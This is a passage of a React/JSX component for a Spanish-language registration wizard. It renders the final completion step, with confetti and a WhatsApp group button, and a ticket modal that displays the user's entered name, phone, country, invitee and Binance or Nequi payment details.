                  <ArrowLeft className="w-4 h-4" />
                  Atrás
                </button>
                <button
                  type="button"
                  onClick={handleNext}
                  disabled={!canProceedStep3}
                  className="inline-flex items-center gap-2 rounded-md px-4 py-2 text-sm text-white bg-primary hover:bg-primary/80 ring-1 ring-primary/50 transition disabled:opacity-40 disabled:cursor-not-allowed"
                >
                  Continuar
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </div>
          )}

          {/* Step 4: Completed */}
          {currentStep === 4 && (
            <div className="space-y-6">
              <div className="flex items-center gap-3">
                <CheckCircle2 className="w-6 h-6 text-blue-400" />
                <h2 className="text-xl font-semibold tracking-tight text-white font-inter">¡Completado! Felicidades</h2>
              </div>
              <p className="text-sm text-muted-foreground -mt-2 font-inter">Tu cuenta está lista. Se abrió el ticket en un modal.</p>

              <div className="flex flex-wrap items-center gap-3">
                <button
                  onClick={() => {
                    setShowTicketModal(true);
                    // Trigger confetti when ticket modal opens
                    setTimeout(() => {
                      confetti({
                        particleCount: 150,
                        spread: 100,
                        origin: { y: 0.6 },
                        colors: ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff']
                      });
                    }, 300);
                  }}
                  className="inline-flex items-center gap-2 rounded-md px-4 py-2 text-sm text-white bg-primary hover:bg-primary/80 ring-1 ring-primary/50 transition"
                >
                  <Ticket className="w-4 h-4" />
                  Mostrar ticket
                </button>
                <button
                  onClick={openWhatsApp}
                  className="inline-flex items-center gap-2 rounded-md px-4 py-2 text-sm text-white bg-green-600 hover:bg-green-500 transition"
                >
                  👉 Únete al Grupo WhatsApp 👈
                </button>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Ticket Modal */}
      {showTicketModal && (
        <div className="fixed inset-0 z-50 overflow-auto bg-black/60">
          <div className="absolute inset-0 bg-black/50 backdrop-blur-sm" onClick={() => setShowTicketModal(false)} />
          <div className="relative mx-auto w-full max-w-3xl px-4 py-8 min-h-full flex items-center justify-center">
            <div className="w-full rounded-2xl bg-[#0c111b] ring-1 ring-white/10 shadow-2xl overflow-hidden">
              <div className="flex items-center justify-between px-6 py-4 border-b border-white/10">
                <div className="flex items-center gap-2">
                  <div className="h-8 w-8 grid place-items-center rounded-md bg-white/10 ring-1 ring-white/10">
                    <span className="text-sm font-semibold tracking-tight text-white">GL</span>
                  </div>
                  <h3 className="text-lg font-semibold tracking-tight text-white font-inter">Tu ticket</h3>
                </div>
                <button
                  onClick={() => setShowTicketModal(false)}
                  className="rounded-md p-2 text-muted-foreground hover:text-white hover:bg-white/5 ring-1 ring-white/10 transition"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="p-6 md:p-8">
                <div className="space-y-5">
                  <div className="flex items-center justify-between">
                    <h3 className="text-xl sm:text-2xl font-semibold tracking-tight text-white flex items-center gap-2 font-inter">
                      <TicketCheck className="w-5 h-5 text-rose-300" />
                      Tu Ticket
                    </h3>
                    <span className="text-xs text-slate-300/80">finalizado</span>
                  </div>

                  <div className="rounded-2xl bg-gradient-to-b from-[#1e06afe6] to-[#00054d] border-white/10 overflow-hidden shadow-2xl">
                    <div className="flex flex-col sm:flex-row">
                      <div className="sm:w-48 p-5 bg-gradient-to-b from-[#00054d] to-[#1e06afe6] relative">
                        <div className="flex flex-col h-full justify-between space-y-4">
                          <div>
                            <p className="text-xs tracking-wider text-white font-inter"># ADMIT ONE</p>
                            <p className="mt-3 text-xs text-white font-inter">ID</p>
                            <p className="text-sm font-medium text-slate-200">{ticketId}</p>
                          </div>
                          <div>
                            <p className="text-xs uppercase tracking-wider text-white font-inter">ID de Orden</p>
                            <p className="text-sm font-medium text-amber-300">{formData.binanceIdStep2}</p>
                          </div>
                          <div>
                            <p className="text-xs uppercase tracking-wider text-white font-inter">ID de Administrador</p>
                            <p className="text-sm font-medium text-amber-300">{formData.binanceIdStep3}</p>
                          </div>
                        </div>
                      </div>

                      <div className="flex-1 p-6">
                        <div className="flex items-start justify-between">
                          <div>
                            <h4 className="text-lg sm:text-xl font-semibold tracking-tight text-amber-300 font-inter">
                              Detalles del registro
                            </h4>
                          </div>
                          <div className="text-right">
                            <p className="text-xs uppercase tracking-wider text-white font-inter">Titular</p>
                            <p className="text-sm font-medium text-slate-200">{formData.name}</p>
                          </div>
                        </div>

                        <div className="h-px bg-white/10 my-4" />

                        <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 text-sm">
                          <div>
                            <p className="text-xs text-white font-inter">Nombres:</p>
                            <p className="font-medium text-slate-200">{formData.name}</p>
                          </div>
                          <div>
                            <p className="text-xs text-white font-inter">WhatsApp:</p>
                            <p className="font-medium text-slate-200">{formData.phone}</p>
                          </div>
                          <div>
                            <p className="text-xs text-white font-inter">País:</p>
                            <p className="font-medium text-slate-200">{formData.country}</p>
                          </div>
                          <div>
                            <p className="text-xs text-white font-inter">Invita a:</p>
                            <p className="font-medium text-slate-200">{formData.invitee}</p>
                          </div>
                          <div>
                            <p className="text-xs text-white font-inter">Dinero:</p>
                            <p className="font-medium text-slate-200">{formData.hasMoney === 'yes' ? 'Sí' : 'No'}</p>
                          </div>
                           <div>
                             <p className="text-xs text-white font-inter">Plataforma:</p>
                             <p className="font-medium text-slate-200">{formData.paymentMethod === 'binance_pay' ? 'Binance' : 'Nequi'}</p>
                           </div>
                           <div>
                             <p className="text-xs text-white font-inter">ID de {formData.paymentMethod === 'binance_pay' ? 'Binance' : 'Nequi'}:</p>
                             <p className="font-medium text-slate-200">{formData.binanceId}</p>
                           </div>
                        </div>

                        <div className="mt-6 rounded-xl border border-amber-400/20 bg-neutral-900/40 p-3">
                          <div className="h-16 w-full rounded-md bg-[repeating-linear-gradient(90deg,rgba(251,191,36,1)_0_8px,transparent_8px_16px)]" />
                        </div>

                        <div className="mt-3 flex items-center justify-between text-xs text-slate-400">
                          <p className="font-inter">Conserva este ticket para futuras referencias.</p>
                          <div className="flex items-center gap-2">
                            <span className="text-white font-inter">Código</span>
                            <span className="font-medium text-amber-300 font-mono">{generatedCodes?.oculto || 'xxxxxxxxxxxx'}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() => setShowTicketModal(false)}
                        className="inline-flex items-center gap-2 rounded-xl px-4 py-2.5 bg-gradient-to-r from-cyan-500/20 to-violet-500/20 hover:from-cyan-500/30 hover:to-violet-500/30 border border-white/10 text-slate-100 transition"
                      >
                        <CheckCircle2 className="w-4 h-4" />
                        Confirmar
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  );
}